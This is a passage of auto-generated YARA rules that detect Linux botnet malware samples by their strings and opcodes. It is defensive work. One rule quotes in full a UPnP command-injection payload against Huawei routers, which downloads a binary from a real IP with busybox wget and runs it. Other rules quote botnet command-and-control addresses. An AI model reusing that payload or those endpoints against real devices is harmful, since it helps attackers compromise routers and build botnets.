      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "92954ed3bad13fb4ccabbefc4455fd4aca25dec509cfc10faca1671b1b15b0c6"
   strings:
      $s1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" fullword ascii
      $s2 = "76-20;-47-60" fullword ascii /* hex encoded string 'v G`' */
      $s3 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" fullword ascii
      $s7 = "gfebvow" fullword ascii
      $s8 = "bpptlqg" fullword ascii
      $s9 = "brvbqjl" fullword ascii
      $s10 = "pvsslqw" fullword ascii
      $s11 = "sbpptlqg" fullword ascii
      $s12 = "pfqmbnf" fullword ascii
      $s13 = "wfomfwbgnjm" fullword ascii
      $s14 = "wpdljmdlm" fullword ascii
      $s15 = "set-cookie:" fullword ascii
      $s16 = "setCookie('" fullword ascii
      $s17 = "server: rootsenpai" fullword ascii
      $s18 = "fmbaof" fullword ascii
      $s19 = "wbYyC10" fullword ascii
      $s20 = "mubojg" fullword ascii

      $op0 = { 23 30 06 00 34 00 bf 8f 30 00 b6 8f 2c 00 b5 8f }
      $op1 = { cc cc 03 3c cd cc 63 34 19 00 43 00 18 00 bc 8f }
      $op2 = { 10 00 bc 8f ff ff 04 34 74 82 99 8f }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_132 {
   meta:
      description = "Linux_132"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "3d8d347c2fdaf8e011648fde523a9d1faf12b429c8a6892f64e19c81a0f373e5"
   strings:
      $s1 = " !'9[P" fullword ascii
      $s2 = " !'9AP" fullword ascii
      $s3 = "@8!$Fj" fullword ascii
      $s4 = " @$cn$" fullword ascii
      $s5 = "H!$Jn40" fullword ascii

      $op0 = { 3c 04 04 11 34 84 49 37 00 44 00 19 8f bc 00 18 }
      $op1 = { 10 00 00 03 34 42 00 04 34 42 00 08 00 00 18 21 }
      $op2 = { 18 21 34 42 00 01 a6 02 00 00 8f bf 00 1c 8f b0 }
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      ( all of them and all of ($op*) )
}

rule Linux_133 {
   meta:
      description = "Linux_133"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f6d13972720bc282e720f8e2b4f3ca68aa653f952b1a533be231a7d5a2026871"
   strings:
      $s1 = "E4tmPh" fullword ascii
      $s2 = "D$pQQjXPR" fullword ascii
      $s3 = "\\$(iD$" fullword ascii
      $s4 = "whQWUR" fullword ascii
      $s5 = "D$(j@j" fullword ascii
      $s6 = "D$$j@j" fullword ascii
      $s7 = "|$'fto" fullword ascii
      $s8 = ";T$(}Q" fullword ascii
      $s9 = "}/C;T$" fullword ascii
      $s10 = "T$`VVj" fullword ascii
      $s11 = "9|$$tBPPj" fullword ascii
      $s12 = "D$,j@j" fullword ascii
      $s13 = "D$$Y[j" fullword ascii
      $s14 = "D$$QQPh" fullword ascii
      $s15 = " 9|$$u" fullword ascii
      $s16 = "D$,Pj," fullword ascii
      $s17 = "D$JPPj" fullword ascii
      $s18 = "D$(;|$(tlPPj" fullword ascii
      $s19 = "PPj h`L" fullword ascii
      $s20 = "u\\PPSV" fullword ascii

      $op0 = { 31 c0 8b 54 24 10 8b 4c 24 64 8b 34 82 8d 04 40 }
      $op1 = { 31 c0 8b 14 24 8b 4c 24 44 8b 34 82 8d 04 40 8d }
      $op2 = { b9 ff ff ff 7f c7 44 24 0c }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_134 {
   meta:
      description = "Linux_134"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "522b56eebbd9e3cdef43e7ce67e21ee1d2a7d2e3100528da3ab8b2844adff487"
   strings:
      $s1 = "E4tmPh" fullword ascii
      $s2 = "D$pQQjXPR" fullword ascii
      $s3 = "lvrvup9w0zwi6nuqf0kilumln8ox5vgv6" fullword ascii
      $s4 = "\\$(iD$" fullword ascii
      $s5 = "whQWUR" fullword ascii
      $s6 = "D$$j@j" fullword ascii
      $s7 = "|$'fto" fullword ascii
      $s8 = ";T$(}Q" fullword ascii
      $s9 = ";|$(t:PPj" fullword ascii
      $s10 = "}/C;T$" fullword ascii
      $s11 = "T$`VVj" fullword ascii
      $s12 = "D$,j@j" fullword ascii
      $s13 = "D$$Y[j" fullword ascii
      $s14 = "D$$QQPh" fullword ascii
      $s15 = " 9|$$u" fullword ascii
      $s16 = "D$(;|$(tlPPj" fullword ascii
      $s17 = "u\\PPSV" fullword ascii
      $s18 = "F,QQPW" fullword ascii
      $s19 = "D$,3D$(P" fullword ascii
      $s20 = ";D$8t`;D$ tZ;D$$tC" fullword ascii

      $op0 = { 31 c0 8b 54 24 10 8b 4c 24 64 8b 34 82 8d 04 40 }
      $op1 = { b9 ff ff ff 7f c7 44 24 0c }
      $op2 = { 89 14 24 e9 4e ff ff ff 83 7c 24 0c 01 19 c0 83 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_135 {
   meta:
      description = "Linux_135"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e37f4fa0e71402767605c95f7a96c841cb0027e82e0a2815e3b4a3ac04740310"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = " -g 103.188.244.189 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii
      $s4 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s5 = "killall" fullword ascii
      $s6 = "E4tmPh" fullword ascii
      $s7 = "MCJBG@K." fullword ascii
      $s8 = "w5q6he3dbrsgmclkiu4to18npavj702f" fullword ascii
      $s9 = " &&  mv " fullword ascii
      $s10 = "xAPPSh`" fullword ascii
      $s11 = "PTRhF?" fullword ascii
      $s12 = "whQWUR" fullword ascii
      $s13 = "D$(j@j" fullword ascii
      $s14 = "|$'fto" fullword ascii
      $s15 = ";T$(}Q" fullword ascii
      $s16 = ";|$(t:PPj" fullword ascii
      $s17 = "}/C;T$" fullword ascii
      $s18 = "D$ [Xj" fullword ascii
      $s19 = "T$`VVj" fullword ascii
      $s20 = "9|$$tBPPj" fullword ascii

      $op0 = { b9 ff ff ff 7f c7 44 24 0c }
      $op1 = { 89 14 24 e9 4e ff ff ff 83 7c 24 0c 01 19 c0 83 }
      $op2 = { c6 44 1c 0e 2d eb ac 85 c0 0f 89 74 ff ff ff 89 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_136 {
   meta:
      description = "Linux_136"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f9b389f4895fbc45328f1403ce5c0c40a33c0fd3165ed367faab6b5e6cb66d94"
   strings:
      $s1 = "[killer] Killed process with PID %d, Path %s" fullword ascii
      $s2 = "[killer] Failed to kill process" fullword ascii
      $s3 = "Failed to kill process" fullword ascii
      $s4 = "[killer] Found process with name %s (PID: %d)" fullword ascii
      $s5 = "[httpd] server started on port %d, listening for connections" fullword ascii
      $s6 = "[killer] Killing random alpha string process %d" fullword ascii
      $s7 = "[killer] Process killed successfully." fullword ascii
      $s8 = "Killing process with PID: %s" fullword ascii
      $s9 = "[httpd] connection established" fullword ascii
      $s10 = "receieved termination command from cnc" fullword ascii
      $s11 = "finished recv http header" fullword ascii
      $s12 = "Error opening /proc directory" fullword ascii
      $s13 = "[main] Attempting to connect to CNC" fullword ascii
      $s14 = "[killer] Failed to open directory /proc" fullword ascii
      $s15 = "Failed to open /proc directory" fullword ascii
      $s16 = "[httpd] failed to open /proc/self/exe" fullword ascii
      $s17 = "[httpd] file size does not match read() return val" fullword ascii
      $s18 = "Resolved %s to %d IPv4 addresses" fullword ascii
      $s19 = "Failed to bind udp socket." fullword ascii
      $s20 = "in udp threads" fullword ascii

      $op0 = { b9 ff ff ff 7f c7 44 24 0c }
      $op1 = { 89 14 24 e9 4e ff ff ff 83 7c 24 0c 01 19 c0 83 }
      $op2 = { 89 7c 24 64 39 d3 7c 34 89 d8 89 54 24 60 29 d0 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_137 {
   meta:
      description = "Linux_137"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7f360a2910e63bb5ee124ad471f1262ee58e1edf290dc88c7f12a8b5405ad55d"
   strings:
      $s1 = "}#XP9)" fullword ascii
      $s2 = "}#Kx8!" fullword ascii
      $s3 = "T`X(}iJx|c" fullword ascii
      $s4 = "|iJxTc" fullword ascii
      $s5 = " }$KxB" fullword ascii
      $s6 = " P}xHP" fullword ascii
      $s7 = "}J>p}GPP" fullword ascii
      $s8 = "\"\\8!\"`N" fullword ascii
      $s9 = "}J>p}IPP~i" fullword ascii
      $s10 = "}KSx}>" fullword ascii
      $s11 = "$}+Kx9k" fullword ascii
      $s12 = "}k>p}iXP" fullword ascii
      $s13 = "})>p}%HP" fullword ascii
      $s14 = ">}(Kx/" fullword ascii
      $s15 = "}k>p}hXP" fullword ascii

      $op0 = { 94 21 ff f0 7c 08 02 a6 93 c1 00 08 3f c0 10 02 }
      $op1 = { 90 01 00 08 56 52 04 3e 56 73 04 3e 56 94 04 3e }
      $op2 = { 57 db 04 3e 90 01 00 08 39 20 00 00 3b 40 00 00 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_138 {
   meta:
      description = "Linux_138"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e19c581a6f7b9b82e959f6a5f9b9a06c57ed83860a75f5e5ece843b332a39109"
   strings:
      $s1 = "?/bin/sh" fullword ascii
      $s2 = "KxTi@.|" fullword ascii
      $s3 = "d/etc/resolv.conf" fullword ascii
      $s4 = "\\})@P/" fullword ascii
      $s5 = "\\}kH.}i" fullword ascii
      $s6 = "}#XP9)" fullword ascii
      $s7 = "}#Kx8!" fullword ascii
      $s8 = "})PP9I" fullword ascii
      $s9 = "})0P})Z" fullword ascii
      $s10 = "}#Kx|j" fullword ascii
      $s11 = "}@PPq`" fullword ascii
      $s12 = "}KSx;@" fullword ascii
      $s13 = "}eXP= " fullword ascii
      $s14 = "a)I7}#H" fullword ascii
      $s15 = "} 899+" fullword ascii
      $s16 = "`P}l[x}" fullword ascii
      $s17 = "}z[x9!" fullword ascii
      $s18 = "}JZx9)" fullword ascii
      $s19 = "})Zx9c" fullword ascii
      $s20 = "}H2x9k" fullword ascii

      $op0 = { 38 81 03 34 90 1b 00 00 38 a0 05 ea 38 c0 40 00 }
      $op1 = { 90 1b 00 00 38 81 03 34 38 a0 05 ea 38 c0 40 00 }
      $op2 = { 39 69 00 34 39 29 00 04 7c 0b 09 2e 42 00 ff f4 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_139 {
   meta:
      description = "Linux_139"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "be2e7e14470eb6ca548c2eb9d5dff13010c0eaeeb23ce46883f371b6834525ca"
   strings:
      $s1 = "(Killer) >> KILLING PID: (%s)" fullword ascii
      $s2 = " /proc/" fullword ascii
      $s3 = "}#XP9)" fullword ascii
      $s4 = "}#Kx8!" fullword ascii
      $s5 = "T`X(}iJx|c" fullword ascii
      $s6 = "|iJxTc" fullword ascii
      $s7 = " }$KxB" fullword ascii
      $s8 = "\"\\8!\"`N" fullword ascii
      $s9 = "}KSx}>" fullword ascii
      $s10 = "$}+Kx9k" fullword ascii
      $s11 = ">}(Kx/" fullword ascii
      $s12 = "}j[x9j" fullword ascii
      $s13 = "} HPU)" fullword ascii

      $op0 = { 94 21 ff f0 7c 08 02 a6 93 c1 00 08 3f c0 10 02 }
      $op1 = { 90 01 00 08 56 52 04 3e 56 73 04 3e 56 94 04 3e }
      $op2 = { 57 db 04 3e 90 01 00 08 39 20 00 00 3b 40 00 00 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_140 {
   meta:
      description = "Linux_140"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "29ef4c5d9172b09d6abc08da800a5a09b460b98aaadf1aa29edda81300fcc609"
   strings:
      $s1 = "condi2 %s:%d" fullword ascii
      $s2 = "netstat" fullword ascii
      $s3 = " /etc/resolv.conf" fullword ascii
      $s4 = "bot.ppc" fullword ascii
      $s5 = "bot.arm" fullword ascii
      $s6 = "?/bin/sh" fullword ascii
      $s7 = "bot.arm5" fullword ascii
      $s8 = "bot.mips" fullword ascii
      $s9 = "@KZYA\\EL@" fullword ascii
      $s10 = "bot.arm7" fullword ascii
      $s11 = "bot.arm6" fullword ascii
      $s12 = "bot.mpsl" fullword ascii
      $s13 = "\\})@P/" fullword ascii
      $s14 = "}#XP9)" fullword ascii
      $s15 = "}#Kx8!" fullword ascii
      $s16 = "})PP9I" fullword ascii
      $s17 = "})0P})Z" fullword ascii
      $s18 = "}#Kx|j" fullword ascii
      $s19 = "}@PPq`" fullword ascii
      $s20 = "}KSx;@" fullword ascii

      $op0 = { 38 60 00 00 90 1f 00 04 48 00 00 34 80 03 00 08 }
      $op1 = { 7c 03 03 78 80 01 00 34 bb 41 00 18 38 21 00 30 }
      $op2 = { 90 01 00 a8 48 00 01 34 3b a1 00 48 7f c3 f3 78 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_141 {
   meta:
      description = "Linux_141"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c6851adf4f68fbb3690986886eb2eb17c9aa344bffb0b09ca419a7d3e6e07ee3"
   strings:
      $s1 = "}#XP9)" fullword ascii
      $s2 = "}#Kx8!" fullword ascii
      $s3 = "T`X(}iJx|c" fullword ascii
      $s4 = "|iJxTc" fullword ascii
      $s5 = " }$KxB" fullword ascii
      $s6 = " P}xHP" fullword ascii
      $s7 = "}J>p}GPP" fullword ascii
      $s8 = "\"\\8!\"`N" fullword ascii
      $s9 = "}J>p}IPP~i" fullword ascii
      $s10 = "$}+Kx9k" fullword ascii
      $s11 = "}k>p}iXP" fullword ascii
      $s12 = "})>p}%HP" fullword ascii
      $s13 = ">}(Kx/" fullword ascii
      $s14 = "}k>p}hXP" fullword ascii
      $s15 = "BAdAsV" fullword ascii
      $s16 = "x|cFp|c" fullword ascii
      $s17 = "X(}iJx" fullword ascii
      $s18 = "Tc@.|c" fullword ascii
      $s19 = "8U h$|" fullword ascii
      $s20 = "})np} HPU+" fullword ascii

      $op0 = { 94 21 ff f0 7c 08 02 a6 93 c1 00 08 3f c0 10 02 }
      $op1 = { 38 a0 00 1c 38 c0 00 00 7f 84 e3 78 54 76 06 3e }
      $op2 = { 60 00 ff ff 54 7a 06 3e 7f 94 00 00 41 9e 03 0c }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_142 {
   meta:
      description = "Linux_142"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1e30f0453e2576b7cd6d74ee95ae434d63dae6bbdba5f6873f73dfee42d8ebf1"
   strings:
      $s1 = "__stdio_mutex_initializer.3862" fullword ascii
      $s2 = "completed.3069" fullword ascii
      $s3 = " 92.249.48.114:1337" fullword ascii
      $s4 = "libc/sysdeps/linux/powerpc/crtn.S" fullword ascii
      $s5 = "libc/sysdeps/linux/powerpc/brk.S" fullword ascii
      $s6 = "libc/sysdeps/linux/powerpc/crti.S" fullword ascii
      $s7 = "libc/sysdeps/linux/powerpc/crt1.S" fullword ascii
      $s8 = "been_there_done_that.2829" fullword ascii
      $s9 = "object.3150" fullword ascii
      $s10 = "?/bin/sh" fullword ascii
      $s11 = "spec_and_mask.4078" fullword ascii
      $s12 = "spec_or_mask.4077" fullword ascii
      $s13 = "spec_base.4073" fullword ascii
      $s14 = "tcsetattr.c" fullword ascii
      $s15 = "libc/sysdeps/linux/powerpc/vfork.S" fullword ascii
      $s16 = "unknown.1128" fullword ascii
      $s17 = "__GI_tcsetattr" fullword ascii
      $s18 = "next_start.1106" fullword ascii
      $s19 = "spec_chars.4075" fullword ascii
      $s20 = "qual_chars.4079" fullword ascii

      $op0 = { 90 01 00 a8 48 00 01 34 3b a1 00 48 7f c3 f3 78 }
      $op1 = { b0 09 00 06 80 1f 00 34 7c 09 03 78 38 09 00 0c }
      $op2 = { 7c 7e 18 f8 3b 40 00 00 98 01 00 0a 7c 7f 1b 78 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_143 {
   meta:
      description = "Linux_143"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b9d84f7904006c21d0bdee32c725cf358a23bddb73b5cc0ba3a157b7bcdd1643"
   strings:
      $s1 = "__stdio_mutex_initializer.3862" fullword ascii
      $s2 = "completed.3069" fullword ascii
      $s3 = "libc/sysdeps/linux/powerpc/crtn.S" fullword ascii
      $s4 = "libc/sysdeps/linux/powerpc/brk.S" fullword ascii
      $s5 = "libc/sysdeps/linux/powerpc/crti.S" fullword ascii
      $s6 = "libc/sysdeps/linux/powerpc/crt1.S" fullword ascii
      $s7 = "been_there_done_that.2829" fullword ascii
      $s8 = "object.3150" fullword ascii
      $s9 = "?/bin/sh" fullword ascii
      $s10 = "spec_and_mask.4078" fullword ascii
      $s11 = "spec_or_mask.4077" fullword ascii
      $s12 = "spec_base.4073" fullword ascii
      $s13 = "tcsetattr.c" fullword ascii
      $s14 = "libc/sysdeps/linux/powerpc/vfork.S" fullword ascii
      $s15 = "unknown.1128" fullword ascii
      $s16 = "__GI_tcsetattr" fullword ascii
      $s17 = "next_start.1106" fullword ascii
      $s18 = "spec_chars.4075" fullword ascii
      $s19 = "qual_chars.4079" fullword ascii
      $s20 = "prefix.4074" fullword ascii

      $op0 = { 90 01 00 a8 48 00 01 34 3b a1 00 48 7f c3 f3 78 }
      $op1 = { 90 1f 00 2c 48 00 0e 34 80 1f 00 2c 81 3f 00 30 }
      $op2 = { 90 1f 01 34 80 1f 02 58 90 1f 01 38 80 1f 00 2c }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_144 {
   meta:
      description = "Linux_144"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1cff10813dd78e9fe51c7644c842a8c971fba6744df63a72ee53aa6b58bd0b2e"
   strings:
      $s1 = "Unable To Connect to Target: %s:%d " fullword ascii
      $s2 = "Connected To Target: %s:%d " fullword ascii
      $s3 = "get_cmdline" fullword ascii
      $s4 = "commandparsing" fullword ascii
      $s5 = "cmdlinekillstrings" fullword ascii
      $s6 = "decodedshit" fullword ascii
      $s7 = "connecthosts" fullword ascii
      $s8 = "killer_cmdlinelol" fullword ascii
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s10 = "cmdparse" fullword ascii
      $s11 = "pathread" fullword ascii
      $s12 = "Sending requests to: %s:%d " fullword ascii
      $s13 = "Device Connected [Name:%s] [Arch:%s] [UID:%d]" fullword ascii
      $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s15 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s16 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5" fullword ascii
      $s17 = "attackpids" fullword ascii
      $s18 = "whitlistpaths" fullword ascii
      $s19 = "estring" fullword ascii
      $s20 = "dstring" fullword ascii

      $op0 = { 98 01 00 16 39 29 c5 34 38 00 00 01 bf c1 00 58 }
      $op1 = { 94 21 ff f0 7c 08 02 a6 93 c1 00 08 3f c0 10 02 }
      $op2 = { 2f 80 00 25 7d 29 0e 70 7c c6 48 78 41 9e 00 0c }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_145 {
   meta:
      description = "Linux_145"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "ef30bd34f8c11e042e2600c62cf702515c94290207cf72fad1ec0d277221bb70"
   strings:
      $s1 = "hoste.6500" fullword ascii
      $s2 = "completed.5580" fullword ascii
      $s3 = " 195.62.32.227:666" fullword ascii
      $s4 = "tcsetattr.c" fullword ascii
      $s5 = "__GI_tcsetattr" fullword ascii
      $s6 = "__GI___waitpid" fullword ascii
      $s7 = "__GI___libc_waitpid" fullword ascii
      $s8 = "__waitpid" fullword ascii
      $s9 = "__sys_recvmsg" fullword ascii
      $s10 = "next_start.1347" fullword ascii
      $s11 = "qual_chars.6264" fullword ascii
      $s12 = "|i.pTk" fullword ascii
      $s13 = "object.5595" fullword ascii
      $s14 = "unknown.1370" fullword ascii
      $s15 = "spec_or_mask.6262" fullword ascii
      $s16 = "spec_and_mask.6263" fullword ascii
      $s17 = "}kSxU) 6}kKxW" fullword ascii
      $s18 = "spec_ranges.6261" fullword ascii
      $s19 = "spec_chars.6260" fullword ascii
      $s20 = "prefix.6256" fullword ascii

      $op0 = { 90 1f 00 0c 80 1f 00 34 90 1f 00 08 48 00 00 38 }
      $op1 = { 7d 34 4b 78 90 09 00 00 7c 9a 23 78 7c b6 2b 78 }
      $op2 = { 38 60 00 00 92 d9 00 08 93 59 00 0c 93 34 00 00 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_146 {
   meta:
      description = "Linux_146"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "08166a0d2fe65a3ad8b289cb2714c3a150635e29664bff24e5befc6b48526899"
   strings:
      $s1 = "/home/landley/aboriginal/aboriginal/build/temp-armv5l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv5l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii
      $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv5l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv5l/build-gcc/gcc" fullword ascii
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv5l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii
      $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv5l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv5l/gcc-core/gcc/config/arm" fullword ascii
      $s8 = "hoste.6548" fullword ascii
      $s9 = "u/etc/hosts" fullword ascii
      $s10 = "__sys_recvmsg" fullword ascii
      $s11 = "resolv_conf_mtime.6591" fullword ascii
      $s12 = "last_ns_num.6605" fullword ascii
      $s13 = "buf_size.5899" fullword ascii
      $s14 = "xdigits.4932" fullword ascii
      $s15 = "last_id.6606" fullword ascii
      $s16 = "/home/landley/aboriginal/aboriginal/build/simple-cross-compiler-armv5l/bin/../cc/include" fullword ascii
      $s17 = "buf.4507" fullword ascii
      $s18 = "i.4743" fullword ascii
      $s19 = "buf.6549" fullword ascii

      $op0 = { dc ff ff ff dc ff ff ff 94 6a 00 00 dc ff ff ff }
      $op1 = { f0 4f 2d e9 08 54 9f e5 08 34 9f e5 05 50 8f e0 }
      $op2 = { ef 00 00 55 e3 0c 00 a0 03 00 00 a0 13 04 d0 8d }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_147 {
   meta:
      description = "Linux_147"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "4509e84a9abcb732f0ee90bf27dd300247b23b6dac9b41cd01f59d6384b5348a"
   strings:
      $s1 = "/home/landley/aboriginal/aboriginal/build/temp-armv4tl/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv4tl/gcc-core/gcc/config/arm/pr-support.c" fullword ascii
      $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv4tl/gcc-core/gcc/config/arm" fullword ascii
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv4tl/build-gcc/gcc" fullword ascii
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv4tl/gcc-core/gcc/config/arm/libunwind.S" fullword ascii
      $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv4tl/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv4tl/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii
      $s8 = "hoste.6548" fullword ascii
      $s9 = "u/etc/hosts" fullword ascii
      $s10 = "__sys_recvmsg" fullword ascii
      $s11 = "resolv_conf_mtime.6591" fullword ascii
      $s12 = "last_ns_num.6605" fullword ascii
      $s13 = "buf_size.5899" fullword ascii
      $s14 = "xdigits.4932" fullword ascii
      $s15 = "last_id.6606" fullword ascii
      $s16 = "/home/landley/aboriginal/aboriginal/build/simple-cross-compiler-armv4tl/bin/../cc/include" fullword ascii
      $s17 = "buf.4507" fullword ascii
      $s18 = "i.4743" fullword ascii
      $s19 = "buf.6549" fullword ascii

      $op0 = { dc ff ff ff dc ff ff ff 94 6a 00 00 dc ff ff ff }
      $op1 = { f0 4f 2d e9 08 54 9f e5 08 34 9f e5 05 50 8f e0 }
      $op2 = { ef 00 00 55 e3 0c 00 a0 03 00 00 a0 13 04 d0 8d }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_148 {
   meta:
      description = "Linux_148"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "ed85c3e25bac63b7e232ac3cfd91116bf7c64f1c4c96b933d5715bbe055ffc89"
   strings:
      $s1 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii
      $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/build-gcc/gcc" fullword ascii
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii
      $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s8 = "hoste.6548" fullword ascii
      $s9 = "u/etc/hosts" fullword ascii
      $s10 = "__sys_recvmsg" fullword ascii
      $s11 = "resolv_conf_mtime.6591" fullword ascii
      $s12 = "last_ns_num.6605" fullword ascii
      $s13 = "buf_size.5899" fullword ascii
      $s14 = "xdigits.4932" fullword ascii
      $s15 = "last_id.6606" fullword ascii
